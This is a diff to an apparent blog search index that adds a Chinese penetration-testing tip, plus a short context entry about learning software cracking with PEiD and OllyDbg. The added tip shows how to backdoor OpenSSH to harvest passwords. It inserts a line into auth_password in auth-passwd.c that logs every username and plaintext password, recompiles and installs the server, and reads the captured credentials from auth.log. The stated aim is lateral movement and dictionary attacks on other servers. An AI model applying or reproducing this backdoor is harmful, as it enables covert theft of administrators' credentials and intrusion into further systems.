@@ -1,6 +1,15 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[重编译OpebSSH记录登录密码]]></title>
+    <url>%2F2018%2F03%2F12%2F%E9%87%8D%E7%BC%96%E8%AF%91OpebSSH%E8%AE%B0%E5%BD%95%E7%99%BB%E5%BD%95%E5%AF%86%E7%A0%81%2F</url>
+    <content type="text"><![CDATA[横向渗透的时候，通过重新编译添加后门 的OpenSSH 记录密码，掌握运维密码组成规律，生成字典去撞其他服务器OpenSSH 源码下载地址 编辑 auth-passwd.c 文件，在 auth_password 函数中添加： 1logit("username: %s password: %s", authctxt-&gt;user, password); 重新编译安装： 12./configure --prefix=/usr --sysconfdir=/etc/ssh --without-zlib-version-check --with-md5-passwords --mandir=/usr/share/manmake &amp;&amp; make install 查看记录的登录密码 1cat /var/log/auth.log]]></content>
+      <tags>
+        <tag>Tips</tag>
+        <tag>Pentest</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[逆向破解学习]]></title>
     <url>%2F2018%2F03%2F06%2F%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3%E5%AD%A6%E4%B9%A0%2F</url>
     <content type="text"><![CDATA[学习最艰难的是走出第一步 查壳PEiD： 查看入口点，即程序的入口地址 查看软件加的什么壳 调试器OllyDbg: 参考资料看雪工具看雪知识库吾爱破解工具包]]></content>
